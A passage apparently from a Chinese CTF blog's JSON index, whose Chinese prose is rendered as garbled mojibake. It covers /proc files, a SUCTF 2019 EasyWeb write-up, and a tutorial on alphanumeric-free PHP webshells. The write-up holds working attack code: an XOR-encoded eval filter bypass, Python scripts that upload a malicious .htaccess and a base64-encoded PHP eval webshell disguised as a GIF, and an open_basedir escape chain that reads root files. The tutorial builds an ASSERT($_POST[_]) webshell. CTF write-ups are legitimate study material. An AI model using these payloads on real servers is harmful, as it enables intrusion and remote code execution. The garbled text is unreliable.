ç¬¬ä¸€ä¸ªå€¼æ˜¯ç³»ç»Ÿè°ƒç”¨å·ï¼ˆ202ä»£è¡¨pollï¼‰ï¼Œåé¢è·Ÿç€ 6 ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‚æ•°å€¼ï¼ˆä½äºå¯„å­˜å™¨ä¸­ï¼‰ï¼Œæœ€åä¸¤ä¸ªå€¼ä¾æ¬¡æ˜¯å †æ ˆæŒ‡é’ˆå’ŒæŒ‡ä»¤è®¡æ•°å™¨çš„å€¼ã€‚å¦‚æœå½“å‰è¿›ç¨‹è™½ç„¶é˜»å¡ï¼Œä½†é˜»å¡å‡½æ•°å¹¶ä¸æ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œåˆ™ç³»ç»Ÿè°ƒç”¨å·çš„å€¼ä¸º -1ï¼Œåé¢åªæœ‰å †æ ˆæŒ‡é’ˆå’ŒæŒ‡ä»¤è®¡æ•°å™¨çš„å€¼ã€‚å¦‚æœè¿›ç¨‹æ²¡æœ‰é˜»å¡ï¼Œåˆ™è¿™ä¸ªæ–‡ä»¶åªæœ‰ä¸€ä¸ª running çš„å­—ç¬¦ä¸²ã€‚ å†…æ ¸ç¼–è¯‘æ—¶æ‰“å¼€äº† CONFIG_HAVE_ARCH_TRACEHOOK ç¼–è¯‘é€‰é¡¹ï¼Œæ‰ä¼šç”Ÿæˆè¿™ä¸ªæ–‡ä»¶ã€‚ /proc/[pid]/wchan/proc/[pid]/wchan æ˜¾ç¤ºå½“è¿›ç¨‹ sleep æ—¶ï¼Œkernel å½“å‰è¿è¡Œçš„å‡½æ•°ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ cat /proc/2406/wchanfutex_wait_queue_meadmin proc/selfæˆ‘ä»¬éƒ½çŸ¥é“å¯ä»¥é€šè¿‡/proc/$pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/$pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡selfè·å–åŸºäºå½“å‰åº”ç”¨çš„ä¸åŒä¿¡æ¯ å‚è€ƒ:https://www.hi-linux.com/posts/64295.htmlhttps://blog.csdn.net/dillanzhou/article/details/82876575","link":"/2021/05/28/CTF%E4%B8%ADlinux%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%B0%8F%E7%BB%93%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89/"},{"title":"buuctf18","text":"å‰è¨€æ„Ÿè§‰æœ€è¿‘æœ‰ç‚¹å°æµ®èºï¼Œå¿…é¡»è¦å°½å¿«è°ƒæ•´~è„šè¸å®åœ°æ‰æ˜¯æœ€é‡è¦çš„ [SUCTF 2019]EasyWeb&lt;?phpfunction get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = &quot;upload/tmp_&quot;.md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[&quot;file&quot;])){ $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); }}$hhh = @$_GET['_'];if (!$hhh){ highlight_file(__FILE__);}if(strlen($hhh)&gt;18){ die('One inch long, one inch strong!');}if ( preg_match('/[\\x00- 0-9A-Za-z\\'&quot;\\`~_&amp;.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);//ä¸å¯ä»¥ä½¿ç”¨è¶…è¿‡12ç§çš„å­—ç¬¦if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt; æ€è·¯:æ‰§è¡Œevalå‡½æ•°ï¼Œç„¶åä¸Šä¼ æ–‡ä»¶é¦–å…ˆéœ€è¦ç»•è¿‡é‚£ä¸ªæ­£åˆ™åŒ¹é…å­—æ¯æ•°å­—çš„ï¼Œä¹‹å‰ä½¿ç”¨å¼‚æˆ–å»å–å­—ç¬¦ import restr = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]{}\\/&quot;# if re.match('[a-zA-Z0-9]+','a'):result=&quot;&quot;print(chr(ord('!')^ord('@')))for j in range(len(str)): for i in range(len(str)): result=chr(ord(str[j])^ord(str[i])) # print(result) if re.match('[a-zA-Z0-9]+',result): print str[j]+&quot;^&quot;+str[i]+&quot;=&quot;+result print(&quot;\\n&quot;) ä½†æ˜¯å‘ç°ä¹Ÿæœ‰è¿‡æ»¤ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸å¤ªè¡Œï¼Œ https://my.oschina.net/u/4306654/blog/3363280ç”¨ä¸€ä¸‹å…¶ä»–åŠæ³• import urllib.parsefind = ['G','E','t','_']for i in range(1,256): for j in range(1,256): result=chr(i^j) if(result in find): a= i.to_bytes(1,byteorder='big')#å°†åè¿›åˆ¶æ•´æ•°ï¼Œè½¬åŒ–ä¸ºbytes(åå…­è¿›åˆ¶) b= j.to_bytes(1,byteorder='big') a= urllib.parse.quote(a)#è¿›è¡ŒURLç¼–ç  b= urllib.parse.quote(b) print(&quot;%s:%s^%s&quot;%(result,a,b)) æˆ‘ä»¬å°†èŒƒå›´æ‰©å¤§åˆ°å¾ˆå¤šä¸å¯è§å­—ç¬¦ï¼Œè¿™é‡Œå°±æ˜¯ä½¿ç”¨asciiç äº†ï¼Œç„¶åä¸ºäº†é˜²æ­¢è¢«è¿‡æ»¤ï¼Œæˆ‘å°±æ‰¾äº†æœ€ä¸‹é¢çš„å‡ ä¸ª t:%FE^%AA_:%FE^%A1G:%FE^%B9E:%FE^%BB ç»•è¿‡18ä¸ªå­—ç¬¦å°±æ˜¯ç”¨getå†ä¼ å‚ä¸€æ¬¡ first_payload for test: ${%A1%B9%BB%AA^%FE%FE%FE%FE}{%A1}();&amp;%A1=phpinfo${_GET}{%A1}()=$_GET(%A1) è¿™é‡Œæœ‰ä¸ªå¾ˆå¥‡æ€ªçš„ç‚¹ï¼Œå°±æ˜¯è¿™ä¸ªtï¼Œåˆ«äººè·‘å‡ºæ¥éƒ½æ˜¯AAæˆ‘è·‘å‡ºæ¥æ˜¯8A=-=ï¼Œæ‰€ä»¥payloadä¸€ç›´ä¸å¯¹ï¼Œä½†æ˜¯æ”¾åˆ°pythoné‡Œé¢å»è§£æï¼Œå»åç¼–ç å›å»ï¼Œåˆæ˜¯æ­£ç¡®çš„?éš¾é“åˆæ˜¯ç‰ˆæœ¬é—®é¢˜å—ï¼Ÿ æ€» æ€»ä¹‹ï¼Œåˆ°è¿™é‡Œå°±å¯ä»¥ç»§ç»­å¾€ä¸‹èµ°äº†ï¼Œæ¥ä¸‹æ¥çœ‹æºç ï¼Œå‘ç°éœ€è¦ä¸Šä¼ æ–‡ä»¶äº†çœ‹ä¸€ä¸‹è¿‡æ»¤å§ï¼š $userdir = &quot;upload/tmp_&quot;.md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[&quot;file&quot;])){ $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); 1.æ£€æŸ¥åç¼€æ˜¯å¦å«æœ‰phã€æ£€æŸ¥å†…å®¹æ˜¯å¦å«æœ‰&lt;?ã€æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡ æ–‡ä»¶ä¸Šä¼ æ€è·¯ç”±äºè¿‡æ»¤äº†phåç¼€çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ä¸Šä¼ user.iniæˆ–è€…htaccessï¼Œè¿™é‡Œæ˜¾ç„¶ä¸Šä¼ htaccessæ›´åˆé€‚ï¼Œå› ä¸ºå¯ä»¥ç”¨æ¥å°†å…¶ä»–éphpçš„æ–‡ä»¶è§£æä¸ºphpï¼Œä½†æ˜¯æ¥ä¸‹æ¥ä¼šæ£€æŸ¥å†…å®¹æ˜¯å¦å«æœ‰&lt;? è¿™é‡Œå°±æ˜¯ä¸€ä¸ªéš¾ç‚¹äº†ï¼Œå› ä¸ºæ­¤æ—¶çŸ­æ ‡ç­¾ç»•è¿‡ä¸äº†ï¼Œæƒ³ç€ä½¿ç”¨&lt;script&gt;è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯åˆšåˆšæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªphpç‰ˆæœ¬ä¸º7.å‡ çš„ è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯æ”¹å˜phpçš„ç¼–ç æ ¼å¼ï¼Œå¦ä¸€ç§æ˜¯ä»¥åŠ å¯†çš„å½¢å¼ä¼ å…¥ï¼Œå¹¶è§£å¯†è¯»å–æ¥ä¸‹æ¥æ˜¯ç»•è¿‡å›¾ç‰‡æ£€æŸ¥ï¼Œè¿™é‡Œä½¿ç”¨çš„å‡½æ•°æ˜¯exit_imagetype()**exif_imagetype()**è¯»å–å›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚æ­¤æ—¶å°±å¾ˆå¦¨ç¢æˆ‘ä»¬ä¸Šä¼ .htaccessäº†ï¼Œè¿™æ ·å°±ä¼šä¸ç¬¦åˆ.htaccessçš„ä¹¦å†™è¯­æ³•ï¼Œå¯¼è‡´æ— æ³•è§£æ.htaccessï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿè¿™é‡Œè¯´ä¸€ä¸‹çœ‹å®ŒWPåçš„ç†è§£ï¼šè¦æ»¡è¶³è¯¥å‡½æ•°çš„æ£€æŸ¥ï¼Œé¦–å…ˆä¼šæ£€æŸ¥ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥å‘ç°ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºç©ºå¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œå³/x00ä½†æ˜¯å› ä¸ºæ˜¯å›¾ç‰‡æ£€æŸ¥ï¼Œåˆéœ€è¦å®šä¹‰å…¶å¤§å°æ‰ä¼šç¬¦åˆå›¾ç‰‡çš„å®šä¹‰ï¼ˆè¿™é‡Œç”±äºä¸äº†è§£exif_imagetype()çš„Cä»£ç è¿è¡Œé€»è¾‘ï¼Œæ‰€ä»¥åªèƒ½å…ˆçŒœæµ‹ä¸€ä¸‹ï¼Œå¾…åé¢æ‰¾åˆ°äº†å†æ¥è¡¥å……ï¼Œé—®äº†ä¸€ä¸‹å­¦é•¿ï¼Œç¡®å®æ˜¯è¿™æ ·ï¼‰ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä¹¦å†™.htaccessçš„å†…å®¹äº†ï¼Œç„¶åä¸Šä¼ å®Œ.htaccesså°±ä¸Šä¼ æˆ‘ä»¬çš„é©¬ï¼Œæ­¤æ—¶ä¹Ÿéœ€è¦åŠ å¯†ä¸€æ³¢å†è¿›è¡Œä¸Šä¼ ï¼Œå¤´çš„æ£€æŸ¥å’Œåˆšæ‰çš„ä¸€æ ·ã€‚ .htaccessæ–‡ä»¶å†…å®¹æ„é€ é¦–å…ˆè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜:æ²¡æœ‰ä¸Šä¼ çª—å£å¦‚ä½•ä¸Šä¼ æ–‡ä»¶â€”â€”ä½¿ç”¨Pythonçš„requestsåº“ä¸Šä¼ æ–‡ä»¶https://blog.csdn.net/five3/article/details/74913742 import requestss=requests.session()conten_htacc=b&quot;&quot;&quot;#define width 1#define height 1AddType application/x-httpd-php .ggphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=tt.gg#è¿™é‡Œå°±å°†å…¶è¿›è¡Œbase64è¿›è¡Œç¼–ç &quot;&quot;&quot;url=&quot;http://135d9802-5db9-41f2-8761-9eeb38a3ece9.node3.buuoj.cn?_=${%A1%B9%BB%AA^%FE%FE%FE%FE}{%A1}();&amp;%A1=get_the_flag&quot;files={ 'file':('.htaccess',conten_htacc,'image/png')}r=s.post(url,files=files)print(r.text) æ ¹æ®è¿™ä¸ªè·å–æ–‡ä»¶å¤¹æ‰€åœ¨ä½ç½®upload/tmp_4f105b2c0ec2da14aae9b130ee13f8e9/.htaccessæ¥ä¸‹æ¥æ˜¯æ„é€ æˆ‘ä»¬çš„å›¾ç‰‡é©¬ import requestsimport base64s=requests.session()url=&quot;http://a199f759-9689-41ad-b7a7-c0bab6144be6.node3.buuoj.cn/?_=${%A1%B9%BB%AA^%FE%FE%FE%FE}{%A1}();&amp;%A1=get_the_flag&quot;content_hta=b&quot;&quot;&quot;#define width 1#define height 1AddType application/x-httpd-php .testphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_233e0752380798f15678fca34b470aea/1.test&quot;&quot;&quot;file1={ 'file':('.htaccess',content_hta,'image/jpeg')}r=s.post(url,files=file1).textprint(r)txt_content=b&quot;GIF89a&quot;+b&quot;aa&quot;+base64.b64encode(b&quot;&lt;?php @eval($_GET[cmd])?&gt;&quot;)file2={ 'file':('1.test',txt_content,'image/jpeg')}r=s.post(url,files=file2).textprint(r) è¿™è¾¹æœ‰ä¸ªå°ç»†èŠ‚ å› ä¸ºæˆ‘ä»¬éœ€è¦è®©phpä¸­çš„å†…å®¹è¿›è¡Œbase64è§£ç ï¼Œä½†æ˜¯å‰é¢åˆæœ‰ä¸ªGIF98aä¸æ˜¯base64ç¼–ç å†…å®¹ï¼Œä¸ºäº†ä¸è®©ç¼–ç ç´Šä¹±ï¼Œbase64çš„ç¼–ç æ˜¯å°†æ¯ä¸‰ä¸ªå­—ç¬¦è½¬åŒ–ä¸ºå››ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆè§£ç çš„æ—¶å€™å°±ä¼šå°†åŸæœ¬çš„å››ä¸ªå­—ç¬¦è½¬åŒ–ä¸ºä¸‰ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æ­¤æ—¶è¦å¤šåŠ ä¸¤ä¸ªå­—ç¬¦ï¼Œæ‰ä¸ä¼šå½±å“åˆ°åé¢çš„é©¬ æ²¡åŠæ³•ç”¨èšå‰‘ç›´æ¥è¿æ¥ï¼Œæ¨æµ‹æ˜¯å› ä¸ºè·¯å¾„é™åˆ¶æ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯ç»•è¿‡open_basedirï¼Œè¿›è¡Œæ–‡ä»¶çš„è¯»å– https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/ https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/ è¿™ç¯‡æ–‡ç« æœ‰å…³äºopen_basedirç»•è¿‡çš„åº•å±‚è¯¦è§£çœ‹å®Œä»¥åæˆ‘çš„ç†è§£æ˜¯è¿™æ ·ï¼Œini_set open_basediråªæ˜¯å…³æ³¨ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„çš„æ‹¼æ¥ï¼Œå…¶å®æ˜¯æ²¡æœ‰å…³æ³¨ç›¸å¯¹è·¯å¾„æ˜¯ä¼šå‘ç”Ÿå˜åŒ–çš„ è¿™é‡Œä¸¾ä¸ªä¾‹å­è¯´æ˜:å‡è®¾æˆ‘ä»¬çš„open_basedirä¸º/var/www/html/ æˆ‘ä»¬ä½äº/var/www/html/test ç›®å½•ä¸‹ï¼Œæ‰§è¡Œç¬¬ä¸€ä¸ªini_setåï¼Œé¦–å…ˆåˆ¤æ–­/var/www/html/test/..å³/var/www/html/æ˜¯å¦ä¸ºopen_basedirå†…ï¼Œåˆ¤æ–­æˆåŠŸï¼Œå› æ­¤ç›´æ¥æ›´æ–°open_basedirä¸º..chdir() å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œchdir(â€˜..â€™) ..æ ¹æ®å½“å‰ç›®å½•è¡¥å…¨åä¸º/var/www/html è€Œopen_basedirè¡¥å…¨ä»¥åä¹Ÿæ˜¯var/www/html åŒæ ·æ»¡è¶³ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥è¿™æ ·ä¸€ç›´è·³è½¬åˆ°æ ¹ç›®å½•ä¸‹ POCé“¾ï¼š cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/')); å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶äº† ?cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g')); å°ç»“æ„Ÿè§‰è¿™é“é¢˜çœŸçš„æ”¶è·å¾ˆå¤šï¼Œè¿™è¾¹ç†ä¸€ä¸‹ï¼šé¦–å…ˆæ˜¯æ€è·¯:æ— å­—æ¯æ•°å­—å¦‚ä½•getshellï¼Ÿâ€”â€”&gt;å¦‚ä½•ç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶â€”â€”&gt;å¦‚ä½•ç»•è¿‡open_basedirè¯»å–æ–‡ä»¶ æ”¶è·çŸ¥è¯†ç‚¹ï¼š1.æ— å­—æ¯æ•°å­—è·å–è„šæœ¬ç¼–å†™2.PHP7ç‰¹æ€§ä¸‹ï¼Œå˜é‡è§£æçš„æ›´æ–°3.htaccess+æ–‡ä»¶åŒ…å«ç»•è¿‡å†…å®¹è¿‡æ»¤ä»¥åŠexif_imagetypeçš„bypass4.open_basedir+ini_set+chdirç»•è¿‡open_basediræ²¡æœ‰å®è·µçš„ç‚¹è®°å½•ä¸€ä¸‹ï¼šexif_imagetype()ä»¥åŠopen_basedir()+ini_set()å‡½æ•°çš„åº•å±‚ä»£ç è·³è½¬è¿‡ç¨‹ å‚è€ƒï¼šhttps://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/https://www.cnblogs.com/20175211lyz/p/11488051.html https://www.jianshu.com/p/6f05923012d7 https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/ https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/","link":"/2021/06/08/buuctf18/"},{"title":"ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell","text":"å‰è¨€å·²ç»åšäº†ä¸¤é¢˜æœ‰å…³æ— æ•°å­—å’Œå­—æ¯çš„getshellï¼Œè¿™é‡Œæ•´ç†ä¸€ä¸‹â€˜ åŸºç¡€ç¯‡æ–¹æ³•ä¸€ï¼šå¼‚æˆ–è¿ç®—è·å¾—å­—ç¬¦åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒåŸç†å¾ˆç®€å•ï¼Œç›´æ¥è´´è„šæœ¬äº†ï¼š import restr = r&quot;!@#$%^*()+&lt;&gt;?;:-[]{}\\/&quot;# if re.match('[a-zA-Z0-9]+','a'):result=&quot;&quot;print(chr(ord('!')^ord('@')))for j in range(len(str)): for i in range(len(str)): result=chr(ord(str[j])^ord(str[i])) # print(result) if re.match('[a-zA-Z0-9]+',result): # if result=='_': print(str[j]+&quot;^&quot;+str[i]+&quot;=&quot;+result) åŒç±»å‹çš„è¿˜æœ‰ä¸€ä¸ªå–å æ–¹æ³•äºŒï¼š++ç‰¹æ€§å–å­—ç¬¦ &lt;?php$_=[];$_=@&quot;$_&quot;; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html æé«˜ç¯‡é•¿åº¦é™åˆ¶+ä¸åŒ…å«$å’Œ_php7ä¸­å…³äºå˜é‡å¤„ç†çš„å˜åŒ–1.è§£æé¡ºåº å¯¹å˜é‡ã€å±æ€§å’Œæ–¹æ³•çš„é—´æ¥è°ƒç”¨ç°åœ¨å°†ä¸¥æ ¼éµå¾ªä»å·¦åˆ°å³çš„é¡ºåºæ¥è§£æ 2.æ‰§è¡ŒåŠ¨æ€å‡½æ•°æ–¹æ³•PHP7å‰æ˜¯ä¸å…è®¸ç”¨($a)();è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡('phpinfo')();æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚ payloadï¼š (~%8F%97%8F%96%91%99%90)(); //(phpinfo)() PHP5ä¸­å¦‚ä½•æ‰§è¡Œæ–¹æ³•æ€ç»´å¯¼å…¥å¤§éƒ¨åˆ†è¯­è¨€éƒ½ä¸æ˜¯å•çº¯çš„é€»è¾‘è¯­è¨€ï¼Œä¸€é—¨å…¨åŠŸèƒ½çš„è¯­è¨€å¿…ç„¶éœ€è¦å’Œæ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œæ“ä½œç³»ç»Ÿé‡Œé¢åŒ…å«æœ€é‡è¦çš„ä¸¤ä¸ªåŠŸèƒ½å°±æ˜¯shell(ç³»ç»Ÿå‘½ä»¤)å’Œæ–‡ä»¶ç³»ç»Ÿã€‚ PHPè‡ªç„¶ä¹Ÿèƒ½å¤Ÿå’Œæ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œâ€œåå¼•å·â€å°±æ˜¯PHPä¸­æœ€ç®€å•çš„æ‰§è¡Œshellçš„æ–¹æ³•ã€‚é‚£ä¹ˆï¼Œåœ¨ä½¿ç”¨PHPæ— æ³•è§£å†³é—®é¢˜çš„æƒ…å†µä¸‹ï¼Œä¸ºä½•ä¸è€ƒè™‘ç”¨â€œåå¼•å·â€+â€œshellâ€çš„æ–¹å¼æ¥getshellå‘¢ï¼Ÿ è¿™é‡Œæœ‰ä¸ªçŸ¥è¯†ç‚¹éœ€è¦äº†è§£ä¸€ä¸‹ï¼Œåœ¨linuxç³»ç»Ÿä¸­ï¼Œè®¸å¤šç³»ç»Ÿå‘½ä»¤éƒ½æ˜¯æœ‰è‡ªå·±çš„è„šæœ¬æ–‡ä»¶åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨è¿™äº›è„šæœ¬æ–‡ä»¶æ¥æ‰§è¡Œshellå‘½ä»¤ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¹‹å‰æ‰€è¯´çš„linuxç³»ç»Ÿä¸­ï¼Œä¸€åˆ‡çš†æ–‡ä»¶çš„æ€æƒ³ï¼Œå³ä½¿ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ ä»‹ç»ä¸¤ä¸ªshellçŸ¥è¯†ç‚¹:1ã€shellå¯ä»¥ç”¨.æ¥æ‰§è¡Œä»»æ„è„šæœ¬ï¼Œå¹¶ä¸”ä¸éœ€è¦fileæœ‰xæƒé™2ã€linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿ æ€è·¯ä¸Šä¼ bashæ–‡ä»¶â€”â€”æ‰§è¡Œæ–‡ä»¶ é—®é¢˜ä¸€ï¼šæ²¡æœ‰ä¸Šä¼ çª—å£æ–‡ä»¶è¯¥å¦‚ä½•ä¸Šä¼ ï¼Ÿ ä½¿ç”¨è„šæœ¬ import requestsfiles={ 'file':open('1.txt',rb)}url=&quot;&quot;response=requests.get(url,files=files)print(reponse.txt) åˆ©ç”¨è„šæœ¬postç›´æ¥ä¸Šä¼  é—®é¢˜äºŒï¼šä¸èƒ½ç”¨å­—æ¯æ•°å­—ï¼Œå¦‚ä½•é€‰ä¸­æ‰€è¦æ‰§è¡Œçš„æ–‡ä»¶ï¼Ÿ è¿™ä¸ªæ—¶å€™å°±åˆ©ç”¨äº†globé€šé…ç¬¦çš„çŸ¥è¯†äº†ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«ä¸´æ—¶å‚¨å­˜åœ¨/tmp/æ–‡ä»¶å¤¹ä¸‹ï¼Œé‚£ä¹ˆå¦‚ä½•ç¡®å®šå…¶ä»–çš„å­—ç¬¦å‘¢ï¼Ÿ *é¦–å…ˆå¯ä»¥ä»£è¡¨0ä¸ªåŠä»¥ä¸Šçš„ä»»æ„å­—ç¬¦**ï¼Ÿå¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦ æ‰€ä»¥æˆ‘ä»¬çš„æ–‡ä»¶åå°±å¯ä»¥è¡¨ç¤ºä¸º/*/??????æˆ–è€…/???/??????ï¼ˆè¿™é‡Œå‡å®šæ–‡ä»¶åä¸º6ä½ï¼‰ ä½†æ˜¯æ­¤æ—¶ï¼Œç¬¦åˆæ­¤æ–‡ä»¶åå¯èƒ½ä¸æ­¢ä¸€ä½ï¼Œæ‰€ä»¥è¯¥å¦‚ä½•æ›´ç²¾å‡†çš„å®šä½å‘¢ï¼Ÿ æ·±å…¥ç†è§£globé€šé…ç¬¦globæ”¯æŒç”¨[^x]çš„æ–¹æ³•æ¥æ„é€ â€œè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€å¹¶ä¸”æ”¯æŒåˆ©ç”¨[0-9]æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ã€‚ 